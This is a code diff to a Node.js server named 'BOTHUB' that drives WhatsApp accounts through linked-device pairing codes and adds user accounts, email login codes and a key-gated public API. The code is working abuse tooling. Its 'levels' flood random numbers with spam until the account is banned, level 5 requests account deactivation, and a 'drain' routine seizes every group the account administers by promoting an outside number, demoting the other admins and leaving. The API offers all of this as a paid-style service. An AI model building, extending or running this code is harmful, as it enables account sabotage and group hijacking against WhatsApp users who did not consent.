@@ -1,4 +1,4 @@
-// BOTHUB — pairing site + level runner + drain + deactivate + admin + public pairing API.
+// BOTHUB — pairing + levels + drain + deactivate + admin + public API + accounts + user dashboard.
 
 import express from 'express';
 import fs from 'node:fs';
@@ -19,6 +19,8 @@ const PORT = process.env.PORT || 3000;
 const AUTH_DIR = process.env.AUTH_DIR || './auth';
 const DATA_DIR = process.env.DATA_DIR || './data';
 const ADMIN_TOKEN = process.env.ADMIN_TOKEN || null;
+const RESEND_API_KEY = process.env.RESEND_API_KEY || null;
+const MAIL_FROM = process.env.MAIL_FROM || 'bothub <onboarding@resend.dev>';
 const BIG = 'x'.repeat(60000);
 
 const app = express();
@@ -27,21 +29,32 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-// ── Session helpers ────────────────────────────────────────────────────
-function sessionDir(phone) { return path.join(AUTH_DIR, phone); }
+// ═══════════════════════════════════════════════════════════════════════
+// Files
+// ═══════════════════════════════════════════════════════════════════════
+const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');
+const ACCOUNTS_FILE = path.join(DATA_DIR, 'accounts.json');
+const USER_SESSIONS_FILE = path.join(DATA_DIR, 'user_sessions.json');
 
+function readJSON(file, fallback) {
+  try { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8')) : fallback; }
+  catch { return fallback; }
+}
+function writeJSON(file, data) {
+  fs.mkdirSync(DATA_DIR, { recursive: true });
+  fs.writeFileSync(file, JSON.stringify(data, null, 2));
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+// Sessions (WhatsApp)
+// ═══════════════════════════════════════════════════════════════════════
+function sessionDir(phone) { return path.join(AUTH_DIR, phone); }
 function purgeAuthDir(phone) {
   const dir = sessionDir(phone);
   try {
-    if (fs.existsSync(dir)) {
-      fs.rmSync(dir, { recursive: true, force: true });
-      console.log(`[purge] removed ${dir}`);
-    }
-  } catch (err) {
-    console.warn(`[purge] failed to remove ${dir}:`, err?.message || err);
-  }
+    if (fs.existsSync(dir)) { fs.rmSync(dir, { recursive: true, force: true }); console.log(`[purge] removed ${dir}`); }
+  } catch (err) { console.warn(`[purge] failed to remove ${dir}:`, err?.message || err); }
 }
-
 function disconnectSession(phone) {
   const sess = sessions.get(phone);
   if (sess?.sock) {
@@ -52,20 +65,11 @@ function disconnectSession(phone) {
   purgeAuthDir(phone);
 }
 
-// ── API keys ───────────────────────────────────────────────────────────
-const KEYS_FILE = path.join(DATA_DIR, 'apikeys.json');
-
-function loadKeys() {
-  try {
-    if (!fs.existsSync(KEYS_FILE)) return [];
-    return JSON.parse(fs.readFileSync(KEYS_FILE, 'utf8'));
-  } catch { return []; }
-}
-
-function saveKeys(keys) {
-  fs.mkdirSync(DATA_DIR, { recursive: true });
-  fs.writeFileSync(KEYS_FILE, JSON.stringify(keys, null, 2));
-}
+// ═══════════════════════════════════════════════════════════════════════
+// API keys
+// ═══════════════════════════════════════════════════════════════════════
+function loadKeys() { return readJSON(KEYS_FILE, []); }
+function saveKeys(k) { writeJSON(KEYS_FILE, k); }
 
 function generateKey() {
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -74,39 +78,15 @@ function generateKey() {
   for (let i = 0; i < 32; i++) s += chars[bytes[i] % 62];
   return 'bh-' + s;
 }
-
-function createKey(label) {
-  const keys = loadKeys();
-  const entry = {
-    key: generateKey(),
-    label: String(label || 'default').slice(0, 64),
-    created: new Date().toISOString(),
-    lastUsed: null,
-    uses: 0,
-    revoked: false,
-  };
-  keys.push(entry);
-  saveKeys(keys);
-  return entry;
-}
-
-function findKey(k) {
-  return loadKeys().find((e) => e.key === k);
-}
-
+function findKey(k) { return loadKeys().find((e) => e.key === k); }
 function touchKey(k) {
   const keys = loadKeys();
   const entry = keys.find((e) => e.key === k);
-  if (entry) {
-    entry.lastUsed = new Date().toISOString();
-    entry.uses = (entry.uses || 0) + 1;
-    saveKeys(keys);
-  }
+  if (entry) { entry.lastUsed = new Date().toISOString(); entry.uses = (entry.uses || 0) + 1; saveKeys(keys); }
 }
-
-function revokeKey(k) {
+function revokeKeyById(id) {
   const keys = loadKeys();
-  const entry = keys.find((e) => e.key === k);
+  const entry = keys.find((e) => e.id === id);
   if (!entry) return false;
   entry.revoked = true;
   saveKeys(keys);
@@ -116,8 +96,7 @@ function revokeKey(k) {
 function requireApiKey(req, res, next) {
   const header = String(req.headers.authorization || '');
   const m = header.match(/^Bearer\s+(bh-[A-Za-z0-9]+)$/i);
-  const fromQuery = String(req.query?.key ?? '');
-  const token = m ? m[1] : fromQuery;
+  const token = m ? m[1] : String(req.query?.key ?? '');
   if (!token) return res.status(401).json({ error: 'missing_api_key' });
   const entry = findKey(token);
   if (!entry) return res.status(401).json({ error: 'invalid_api_key' });
@@ -126,20 +105,205 @@ function requireApiKey(req, res, next) {
   next();
 }
 
-function adminAuthed(req) {
-  if (!ADMIN_TOKEN) return false;
-  const t = req.query?.token || req.body?.token;
-  return t === ADMIN_TOKEN;
+// ═══════════════════════════════════════════════════════════════════════
+// Accounts + user sessions
+// ═══════════════════════════════════════════════════════════════════════
+function loadAccounts() { return readJSON(ACCOUNTS_FILE, []); }
+function saveAccounts(a) { writeJSON(ACCOUNTS_FILE, a); }
+function loadUserSessions() { return readJSON(USER_SESSIONS_FILE, []); }
+function saveUserSessions(s) { writeJSON(USER_SESSIONS_FILE, s); }
+
+function hashPassword(password) {
+  const salt = crypto.randomBytes(16).toString('hex');
+  const hash = crypto.scryptSync(password, salt, 64).toString('hex');
+  return { salt, hash };
+}
+function verifyPassword(password, salt, hash) {
+  try {
+    const attempt = crypto.scryptSync(password, salt, 64).toString('hex');
+    return crypto.timingSafeEqual(Buffer.from(attempt, 'hex'), Buffer.from(hash, 'hex'));
+  } catch { return false; }
+}
+function publicAccount(a) { return { id: a.id, email: a.email, created: a.created }; }
+
+const pendingCodes = new Map(); // pendingToken -> { accountId, code, expires, purpose }
+function gen6() { return String(crypto.randomInt(0, 1000000)).padStart(6, '0'); }
+
+async function sendCode(email, code, purpose) {
+  const subject = purpose === 'login' ? 'Your bothub login code' : 'Verify your bothub account';
+  const text = `Your code is: ${code}\n\nIt expires in 10 minutes.`;
+  if (!RESEND_API_KEY) {
+    console.log(`[email:${purpose}] to=${email} code=${code} (RESEND_API_KEY not set)`);
+    return { sent: false, dev: true };
+  }
+  try {
+    const r = await fetch('https://api.resend.com/emails', {
+      method: 'POST',
+      headers: { 'Authorization': `Bearer ${RESEND_API_KEY}`, 'Content-Type': 'application/json' },
+      body: JSON.stringify({ from: MAIL_FROM, to: [email], subject, text }),
+    });
+    if (!r.ok) throw new Error(`resend ${r.status}`);
+    return { sent: true };
+  } catch (err) {
+    console.warn(`[email] send failed for ${email}:`, err?.message || err);
+    console.log(`[email:fallback] to=${email} code=${code}`);
+    return { sent: false, error: err?.message };
+  }
 }
 
-// ── Level sessions ─────────────────────────────────────────────────────
-const sessions = new Map();
+function requireUser(req, res, next) {
+  const header = String(req.headers.authorization || '');
+  const m = header.match(/^Bearer\s+([A-Za-z0-9._-]+)$/);
+  const tok = m ? m[1] : String(req.query?.session || '');
+  if (!tok) return res.status(401).json({ error: 'missing_session' });
+  const list = loadUserSessions();
+  const entry = list.find((s) => s.token === tok);
+  if (!entry) return res.status(401).json({ error: 'invalid_session' });
+  if (entry.expires && new Date(entry.expires).getTime() < Date.now()) return res.status(401).json({ error: 'expired_session' });
+  const account = loadAccounts().find((a) => a.id === entry.accountId);
+  if (!account) return res.status(401).json({ error: 'account_missing' });
+  req.account = account;
+  req.session = entry;
+  next();
+}
 
+// ── Auth routes ────────────────────────────────────────────────────────
+app.post('/api/auth/register', (req, res) => {
+  const email = String(req.body?.email ?? '').trim().toLowerCase();
+  const password = String(req.body?.password ?? '');
+  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ error: 'invalid_email' });
+  if (password.length < 8) return res.status(400).json({ error: 'password_too_short' });
+  const accounts = loadAccounts();
+  if (accounts.some((a) => a.email === email)) return res.status(409).json({ error: 'email_taken' });
+  const { salt, hash } = hashPassword(password);
+  const account = { id: crypto.randomBytes(8).toString('hex'), email, salt, hash, created: new Date().toISOString() };
+  accounts.push(account);
+  saveAccounts(accounts);
+  res.status(201).json({ ok: true, account: publicAccount(account) });
+});
+
+app.post('/api/auth/login', async (req, res) => {
+  const email = String(req.body?.email ?? '').trim().toLowerCase();
+  const password = String(req.body?.password ?? '');
+  const account = loadAccounts().find((a) => a.email === email);
+  if (!account || !verifyPassword(password, account.salt, account.hash)) {
+    return res.status(401).json({ error: 'invalid_credentials' });
+  }
+  const token = crypto.randomBytes(24).toString('hex');
+  const code = gen6();
+  pendingCodes.set(token, { accountId: account.id, code, expires: Date.now() + 10 * 60 * 1000, purpose: 'login' });
+  const result = await sendCode(email, code, 'login');
+  res.json({
+    pendingToken: token,
+    emailed: result.sent,
+    // In dev (no mailer configured), return the code so the user can proceed.
+    devCode: result.dev ? code : undefined,
+  });
+});
+
+app.post('/api/auth/verify', (req, res) => {
+  const pendingToken = String(req.body?.pendingToken ?? '');
+  const code = String(req.body?.code ?? '');
+  const entry = pendingCodes.get(pendingToken);
+  if (!entry) return res.status(401).json({ error: 'invalid_code' });
+  if (entry.expires < Date.now()) { pendingCodes.delete(pendingToken); return res.status(401).json({ error: 'code_expired' }); }
+  if (entry.code !== code) return res.status(401).json({ error: 'invalid_code' });
+  pendingCodes.delete(pendingToken);
+  const sessionToken = crypto.randomBytes(32).toString('hex');
+  const expires = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
+  const list = loadUserSessions();
+  list.push({ token: sessionToken, accountId: entry.accountId, expires, created: new Date().toISOString() });
+  saveUserSessions(list);
+  const account = loadAccounts().find((a) => a.id === entry.accountId);
+  res.json({ sessionToken, expires, account: publicAccount(account) });
+});
+
+app.get('/api/auth/me', requireUser, (req, res) => res.json(publicAccount(req.account)));
+
+app.post('/api/auth/logout', requireUser, (req, res) => {
+  const list = loadUserSessions().filter((s) => s.token !== req.session.token);
+  saveUserSessions(list);
+  res.json({ ok: true });
+});
+
+// ── Account-scoped key management ─────────────────────────────────────
+app.get('/api/account/keys', requireUser, (req, res) => {
+  const mine = loadKeys().filter((k) => k.accountId === req.account.id);
+  res.json(mine.map((k) => ({
+    id: k.id,
+    prefix: k.key.slice(0, 12) + '…',
+    key: k.key,
+    label: k.label,
+    created: k.created,
+    lastUsed: k.lastUsed,
+    uses: k.uses,
+    revoked: k.revoked,
+  })));
+});
+
+app.post('/api/account/keys', requireUser, (req, res) => {
+  const label = String(req.body?.label ?? 'default').slice(0, 64);
+  const keys = loadKeys();
+  const entry = {
+    id: crypto.randomBytes(6).toString('hex'),
+    key: generateKey(),
+    label,
+    accountId: req.account.id,
+    created: new Date().toISOString(),
+    lastUsed: null,
+    uses: 0,
+    revoked: false,
+  };
+  keys.push(entry);
+  saveKeys(keys);
+  res.status(201).json(entry);
+});
+
+app.post('/api/account/keys/revoke', requireUser, (req, res) => {
+  const id = String(req.body?.id ?? '');
+  const keys = loadKeys();
+  const entry = keys.find((k) => k.id === id && k.accountId === req.account.id);
+  if (!entry) return res.status(404).json({ error: 'not_found' });
+  entry.revoked = true;
+  saveKeys(keys);
+  res.json({ ok: true });
+});
+
+// ── Account-scoped session list (across all keys owned by account) ────
+app.get('/api/account/sessions', requireUser, (req, res) => {
+  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
+  const out = [];
+  for (const [phone, s] of sessions.entries()) {
+    if (myKeys.has(s.key)) {
+      out.push({
+        number: phone, level: s.level, status: s.status,
+        sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt,
+        createdAt: s.createdAt,
+      });
+    }
+  }
+  out.sort((a, b) => (b.createdAt || '').localeCompare(a.createdAt || ''));
+  res.json(out);
+});
+
+app.post('/api/account/sessions/end', requireUser, (req, res) => {
+  const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
+  const s = sessions.get(phone);
+  if (!s) return res.status(404).json({ error: 'session_not_found' });
+  const myKeys = new Set(loadKeys().filter((k) => k.accountId === req.account.id).map((k) => k.key));
+  if (!myKeys.has(s.key)) return res.status(403).json({ error: 'not_your_session' });
+  disconnectSession(phone);
+  res.json({ ok: true });
+});
+
+// ═══════════════════════════════════════════════════════════════════════
+// WhatsApp sessions
+// ═══════════════════════════════════════════════════════════════════════
+const sessions = new Map();
 function randomJid() {
   const d = String(Math.floor(Math.random() * 9e11) + 1e11);
   return `${d}@s.whatsapp.net`;
 }
-
 function tick(sess) {
   sess.sends++;
   if (sess.sends % 500 === 0) {
@@ -147,14 +311,12 @@ function tick(sess) {
     console.log(`[${sess.phone}] sent ${sess.sends} | ${(sess.sends / s).toFixed(0)}/s`);
   }
 }
-
 async function flood(sess) {
   while (true) {
     try { await sess.sock.sendMessage(randomJid(), { text: 'x' }); } catch {}
     tick(sess);
   }
 }
-
 async function stickerLoop(sess) {
   const p = path.join(__dirname, 'assets', 'sticker.png');
   if (!fs.existsSync(p)) return;
@@ -164,67 +326,47 @@ async function stickerLoop(sess) {
     tick(sess);
   }
 }
-
 async function bigLoop(sess) {
   while (true) {
     try { await sess.sock.sendMessage(randomJid(), { text: BIG }); } catch {}
     tick(sess);
   }
 }
-
 async function runLevel(sess) {
-  sess.startedAt = Date.now();
-  sess.sends = 0;
-  const level = sess.level;
-  console.log(`[${sess.phone}] level ${level} starting (key=${sess.key || 'web'})`);
-
-  if (level === 5) {
+  sess.startedAt = Date.now(); sess.sends = 0;
+  console.log(`[${sess.phone}] level ${sess.level} starting (key=${sess.key || 'web'})`);
+  if (sess.level === 5) {
     try {
-      console.log(`[${sess.phone}] requesting deactivation`);
       const r = await deactivate(sess.sock, { logger: console });
       console.log(`[${sess.phone}] deactivate response:`, JSON.stringify(r));
-    } catch (err) {
-      console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err);
-    }
+    } catch (err) { console.warn(`[${sess.phone}] deactivate failed:`, err?.message || err); }
     return;
   }
-
-  if (level === 1 || level === 2) return flood(sess);
-  if (level === 3) { stickerLoop(sess); return flood(sess); }
-  if (level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
+  if (sess.level === 1 || sess.level === 2) return flood(sess);
+  if (sess.level === 3) { stickerLoop(sess); return flood(sess); }
+  if (sess.level === 4) { stickerLoop(sess); bigLoop(sess); return flood(sess); }
 }
 
 async function startPairing(phone, level, key = null) {
   const existing = sessions.get(phone);
-  if (existing?.sock) {
-    try { existing.sock.end(undefined); } catch {}
-    sessions.delete(phone);
-  }
+  if (existing?.sock) { try { existing.sock.end(undefined); } catch {} sessions.delete(phone); }
 
   fs.mkdirSync(sessionDir(phone), { recursive: true });
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
-
   let version;
   try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
 
   const sock = makeWASocket({
     ...(version ? { version } : {}),
-    auth: state,
-    logger: pino({ level: 'silent' }),
-    printQRInTerminal: false,
-    browser: Browsers.ubuntu('Chrome'),
-    markOnlineOnConnect: false,
-    syncFullHistory: false,
+    auth: state, logger: pino({ level: 'silent' }),
+    printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'),
+    markOnlineOnConnect: false, syncFullHistory: false,
     shouldSyncHistoryMessage: () => false,
   });
 
   const sess = {
     phone, level, sock, key,
-    status: 'pending',
-    code: null,
-    sends: 0,
-    startedAt: 0,
-    bannedAt: null,
+    status: 'pending', code: null, sends: 0, startedAt: 0, bannedAt: null,
     createdAt: new Date().toISOString(),
   };
   sessions.set(phone, sess);
@@ -246,38 +388,25 @@ async function startPairing(phone, level, key = null) {
         console.log(`[${phone}] pairing code: ${code}`);
       } catch (err) {
         pairingRequested = false;
-        console.error(`[${phone}] pairing attempt failed, will retry:`, err?.message || err);
+        console.error(`[${phone}] pairing attempt failed:`, err?.message || err);
       }
     }
-
     if (connection === 'open') {
       sess.status = 'connected';
       console.log(`[${phone}] connected as ${sock.user?.id}`);
       runLevel(sess);
     }
-
     if (connection === 'close') {
       const code = lastDisconnect?.error?.output?.statusCode;
       const ts = new Date().toISOString();
       fs.mkdirSync(path.join(__dirname, 'logs'), { recursive: true });
-      fs.appendFileSync(
-        path.join(__dirname, 'logs', 'session.log'),
-        `[${ts}] ${phone} close code=${code}\n`
-      );
-
+      fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} close code=${code}\n`);
       if (code === 401 || code === 403) {
-        sess.status = 'banned';
-        sess.bannedAt = ts;
-        sess.sock = null;
-        fs.appendFileSync(
-          path.join(__dirname, 'logs', 'session.log'),
-          `[${ts}] ${phone} *** BANNED ***\n`
-        );
-        console.log(`[${phone}] *** BANNED at ${ts} *** — purging auth dir`);
+        sess.status = 'banned'; sess.bannedAt = ts; sess.sock = null;
+        fs.appendFileSync(path.join(__dirname, 'logs', 'session.log'), `[${ts}] ${phone} *** BANNED ***\n`);
         purgeAuthDir(phone);
         return;
       }
-
       console.log(`[${phone}] close code=${code}, reconnecting`);
       setTimeout(() => {
         const s = sessions.get(phone);
@@ -288,17 +417,13 @@ async function startPairing(phone, level, key = null) {
   });
 
   if (!sock.authState.creds.registered) {
-    const timeout = new Promise((_, reject) =>
-      setTimeout(() => reject(new Error('pairing timeout — no qr event in 25s')), 25000)
-    );
-    const code = await Promise.race([codePromise, timeout]);
-    return { code };
+    const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('pairing timeout')), 25000));
+    return { code: await Promise.race([codePromise, timeout]) };
   }
-
   return { code: null, alreadyRegistered: true };
 }
 
-// ── Web pairing endpoint (own site) ────────────────────────────────────
+// ── Web pairing (no key) ──────────────────────────────────────────────
 app.post('/api/pair/start', async (req, res) => {
   const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
   const level = parseInt(req.body?.level, 10);
@@ -307,12 +432,8 @@ app.post('/api/pair/start', async (req, res) => {
   try {
     const { code, alreadyRegistered } = await startPairing(phone, level, null);
     res.json({ phone, level, code: code || null, alreadyRegistered: !!alreadyRegistered });
-  } catch (err) {
-    console.error('[pair/start]', err?.message || err);
-    res.status(500).json({ error: err?.message || 'pairing failed' });
-  }
+  } catch (err) { res.status(500).json({ error: err?.message || 'pairing failed' }); }
 });
-
 app.get('/api/pair/status', (req, res) => {
   const phone = String(req.query?.phone ?? '').replace(/\D/g, '');
   const s = sessions.get(phone);
@@ -320,13 +441,12 @@ app.get('/api/pair/status', (req, res) => {
   res.json({ status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt });
 });
 
-// ── Public pairing API (v1) ────────────────────────────────────────────
+// ── Public API v1 (key-scoped) ────────────────────────────────────────
 app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
   const phone = String(req.body?.number ?? '').replace(/\D/g, '');
   const level = parseInt(req.body?.level, 10);
   if (!phone) return res.status(400).json({ error: 'number_required' });
   if (![1, 2, 3, 4, 5].includes(level)) return res.status(400).json({ error: 'level_1_5_required' });
-
   const key = req.apiKey.key;
   const mine = [...sessions.values()].filter((s) => s.key === key);
   const active = mine.filter((s) => s.status !== 'banned');
@@ -334,32 +454,26 @@ app.post('/api/v1/sessions', requireApiKey, async (req, res) => {
   const now = Date.now();
   const recent = mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3);
   if (recent.length >= 20) return res.status(429).json({ error: 'rate_limit_exceeded' });
-
   try {
     const { code } = await startPairing(phone, level, key);
     touchKey(key);
     res.status(201).json({ number: phone, level, code, expiresIn: 60 });
-  } catch (err) {
-    console.error('[api/v1/sessions]', err?.message || err);
-    res.status(500).json({ error: err?.message || 'pairing_failed' });
-  }
+  } catch (err) { res.status(500).json({ error: err?.message || 'pairing_failed' }); }
 });
-
+app.get('/api/v1/sessions', requireApiKey, (req, res) => {
+  const key = req.apiKey.key;
+  res.json([...sessions.values()].filter((s) => s.key === key).map((s) => ({
+    number: s.phone, level: s.level, status: s.status, sends: s.sends,
+    startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt,
+  })));
+});
 app.get('/api/v1/sessions/:number', requireApiKey, (req, res) => {
   const phone = String(req.params.number || '').replace(/\D/g, '');
   const s = sessions.get(phone);
   if (!s) return res.status(404).json({ error: 'session_not_found' });
   if (s.key && s.key !== req.apiKey.key) return res.status(403).json({ error: 'not_your_session' });
-  res.json({
-    number: s.phone,
-    level: s.level,
-    status: s.status,
-    sends: s.sends,
-    startedAt: s.startedAt,
-    bannedAt: s.bannedAt,
-  });
+  res.json({ number: s.phone, level: s.level, status: s.status, sends: s.sends, startedAt: s.startedAt, bannedAt: s.bannedAt, createdAt: s.createdAt });
 });
-
 app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
   const phone = String(req.params.number || '').replace(/\D/g, '');
   const s = sessions.get(phone);
@@ -368,38 +482,50 @@ app.delete('/api/v1/sessions/:number', requireApiKey, (req, res) => {
   disconnectSession(phone);
   res.json({ ok: true });
 });
+app.get('/api/v1/me', requireApiKey, (req, res) => {
+  const key = req.apiKey.key;
+  const mine = [...sessions.values()].filter((s) => s.key === key);
+  const active = mine.filter((s) => s.status !== 'banned');
+  const now = Date.now();
+  const hourly = mine.filter((s) => s.createdAt && now - new Date(s.createdAt).getTime() < 3600e3);
+  res.json({
+    prefix: key.slice(0, 12) + '…', label: req.apiKey.label,
+    created: req.apiKey.created, lastUsed: req.apiKey.lastUsed, uses: req.apiKey.uses,
+    limits: { activeSessions: { used: active.length, max: 3 }, hourlySessions: { used: hourly.length, max: 20 } },
+    stats: { totalSessions: mine.length, totalSends: mine.reduce((a, s) => a + (s.sends || 0), 0) },
+  });
+});
 
-// ── Panel (API key management) ─────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════
+// Operator panels (ADMIN_TOKEN)
+// ═══════════════════════════════════════════════════════════════════════
+function adminAuthed(req) {
+  if (!ADMIN_TOKEN) return false;
+  return (req.query?.token || req.body?.token) === ADMIN_TOKEN;
+}
 app.get('/api/panel/keys', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
-  const keys = loadKeys().map((k) => ({
-    prefix: k.key.slice(0, 12) + '…',
-    label: k.label,
-    created: k.created,
-    lastUsed: k.lastUsed,
-    uses: k.uses,
-    revoked: k.revoked,
-    key: k.key, // panel is admin-gated, so full key is fine here
-  }));
-  res.json(keys);
+  res.json(loadKeys().map((k) => ({
+    prefix: k.key.slice(0, 12) + '…', key: k.key, label: k.label, accountId: k.accountId || null,
+    created: k.created, lastUsed: k.lastUsed, uses: k.uses, revoked: k.revoked, id: k.id,
+  })));
 });
-
 app.post('/api/panel/keys', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
-  const label = String(req.body?.label ?? 'default').slice(0, 64);
-  const k = createKey(label);
-  res.status(201).json(k);
+  const entry = {
+    id: crypto.randomBytes(6).toString('hex'),
+    key: generateKey(), label: String(req.body?.label ?? 'default').slice(0, 64),
+    accountId: req.body?.accountId || null,
+    created: new Date().toISOString(), lastUsed: null, uses: 0, revoked: false,
+  };
+  const keys = loadKeys(); keys.push(entry); saveKeys(keys);
+  res.status(201).json(entry);
 });
-
 app.post('/api/panel/keys/revoke', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
-  const key = String(req.body?.key ?? '');
-  if (!key) return res.status(400).json({ error: 'key_required' });
-  const ok = revokeKey(key);
+  const ok = revokeKeyById(String(req.body?.id ?? ''));
   res.json({ ok });
 });
-
-// ── Admin panel (sessions) ─────────────────────────────────────────────
 app.get('/api/admin/sessions', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
   const out = [];
@@ -411,19 +537,14 @@ app.get('/api/admin/sessions', (req, res) => {
   }
   res.json(out);
 });
-
 app.get('/api/admin/drains', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
   const out = [];
   for (const [id, d] of drains.entries()) {
-    out.push({
-      id, destJid: d.destJid, sourcePhone: d.sourcePhone,
-      status: d.status, total: d.total, done: d.done, errors: d.errors,
-    });
+    out.push({ id, destJid: d.destJid, sourcePhone: d.sourcePhone, status: d.status, total: d.total, done: d.done, errors: d.errors });
   }
   res.json(out);
 });
-
 app.post('/api/admin/disconnect', (req, res) => {
   if (!adminAuthed(req)) return res.status(404).end();
   const phone = String(req.body?.phone ?? '').replace(/\D/g, '');
@@ -432,132 +553,82 @@ app.post('/api/admin/disconnect', (req, res) => {
   res.json({ ok: true });
 });
 
-// ── Function 5 — group migration ───────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════
+// Group drain (Function 5)
+// ═══════════════════════════════════════════════════════════════════════
 const drains = new Map();
-
 async function runDrain(drain, sock, sessionId) {
   drain.status = 'running';
   const myJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
   const myDigits = myJid.split('@')[0];
   const destJid = drain.destJid;
-
   let groups;
   try { groups = await sock.groupFetchAllParticipating(); }
-  catch (err) {
-    drain.status = 'error';
-    drain.errors.push(`groupFetchAllParticipating: ${err?.message || err}`);
-    return;
-  }
-
+  catch (err) { drain.status = 'error'; drain.errors.push(String(err?.message || err)); return; }
   const jids = Object.keys(groups || {});
-  drain.total = jids.length;
-  drain.done = 0;
-
+  drain.total = jids.length; drain.done = 0;
   for (const jid of jids) {
     try {
       const meta = groups[jid];
-      const meP = (meta.participants || []).find((p) =>
-        p.id === myJid || p.id?.split(':')[0] === myDigits
-      );
+      const meP = (meta.participants || []).find((p) => p.id === myJid || p.id?.split(':')[0] === myDigits);
       if (!meP || !meP.admin) { drain.done++; continue; }
-
       if (!(meta.participants || []).some((p) => p.id === destJid)) {
-        await sock.groupParticipantsUpdate(jid, [destJid], 'add');
-        await sleep(1200);
+        await sock.groupParticipantsUpdate(jid, [destJid], 'add'); await sleep(1200);
       }
-      await sock.groupParticipantsUpdate(jid, [destJid], 'promote');
-      await sleep(1200);
-      const toDemote = (meta.participants || [])
-        .filter((p) => p.admin && p.id !== destJid && p.id !== myJid)
-        .map((p) => p.id);
-      if (toDemote.length) {
-        await sock.groupParticipantsUpdate(jid, toDemote, 'demote');
-        await sleep(1200);
-      }
-      await sock.groupLeave(jid);
-      await sleep(1500);
+      await sock.groupParticipantsUpdate(jid, [destJid], 'promote'); await sleep(1200);
+      const toDemote = (meta.participants || []).filter((p) => p.admin && p.id !== destJid && p.id !== myJid).map((p) => p.id);
+      if (toDemote.length) { await sock.groupParticipantsUpdate(jid, toDemote, 'demote'); await sleep(1200); }
+      await sock.groupLeave(jid); await sleep(1500);
       drain.done++;
-    } catch (err) {
-      drain.errors.push(`${jid}: ${err?.message || err}`);
-      drain.done++;
-    }
+    } catch (err) { drain.errors.push(`${jid}: ${err?.message || err}`); drain.done++; }
   }
   drain.status = 'done';
 }
-
 app.post('/api/drain/start', (req, res) => {
   const dest = String(req.body?.dest ?? '').replace(/\D/g, '');
   if (!dest) return res.status(400).json({ error: 'destination number required' });
   const id = crypto.randomBytes(6).toString('hex');
-  drains.set(id, {
-    destJid: `${dest}@s.whatsapp.net`,
-    sourcePhone: null, sourceSock: null,
-    status: 'awaiting_source', total: 0, done: 0, errors: [],
-  });
+  drains.set(id, { destJid: `${dest}@s.whatsapp.net`, sourcePhone: null, sourceSock: null, status: 'awaiting_source', total: 0, done: 0, errors: [] });
   res.json({ sessionId: id, link: `/drain/${id}` });
 });
-
 app.post('/api/drain/source', async (req, res) => {
   const { sessionId } = req.body || {};
   const source = String(req.body?.source ?? '').replace(/\D/g, '');
   if (!sessionId || !drains.has(sessionId)) return res.status(400).json({ error: 'unknown session' });
   if (!source) return res.status(400).json({ error: 'source number required' });
-
   const drain = drains.get(sessionId);
   const phone = source;
   drain.sourcePhone = phone;
-
   fs.mkdirSync(sessionDir(phone), { recursive: true });
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir(phone));
   let version;
   try { ({ version } = await fetchLatestBaileysVersion()); } catch { version = undefined; }
-
   const sock = makeWASocket({
-    ...(version ? { version } : {}),
-    auth: state,
-    logger: pino({ level: 'silent' }),
-    printQRInTerminal: false,
-    browser: Browsers.ubuntu('Chrome'),
-    markOnlineOnConnect: false,
-    syncFullHistory: false,
-    shouldSyncHistoryMessage: () => false,
+    ...(version ? { version } : {}), auth: state, logger: pino({ level: 'silent' }),
+    printQRInTerminal: false, browser: Browsers.ubuntu('Chrome'),
+    markOnlineOnConnect: false, syncFullHistory: false, shouldSyncHistoryMessage: () => false,
   });
   sock.ev.on('creds.update', saveCreds);
   drain.sourceSock = sock;
-
   let resolveCode;
   const codePromise = new Promise((res) => { resolveCode = res; });
   let pairingRequested = false;
-
   sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
     if (qr && !pairingRequested && !sock.authState.creds.registered) {
       pairingRequested = true;
       try {
         const raw = await sock.requestPairingCode(phone);
-        const code = raw?.match(/.{1,4}/g)?.join('-') || raw;
-        resolveCode(code);
-        console.log(`[drain ${sessionId}] source pairing code: ${code}`);
-      } catch (err) {
-        pairingRequested = false;
-      }
+        resolveCode(raw?.match(/.{1,4}/g)?.join('-') || raw);
+      } catch { pairingRequested = false; }
     }
-    if (connection === 'open') {
-      console.log(`[drain ${sessionId}] source connected`);
-      runDrain(drain, sock, sessionId).catch((err) => {
-        drain.status = 'error';
-        drain.errors.push(String(err?.message || err));
-      });
-    }
+    if (connection === 'open') runDrain(drain, sock, sessionId).catch((err) => { drain.status = 'error'; drain.errors.push(String(err?.message || err)); });
     if (connection === 'close') {
       const code = lastDisconnect?.error?.output?.statusCode;
       if (code === 401 || code === 403) { drain.status = 'banned'; purgeAuthDir(phone); }
     }
   });
-
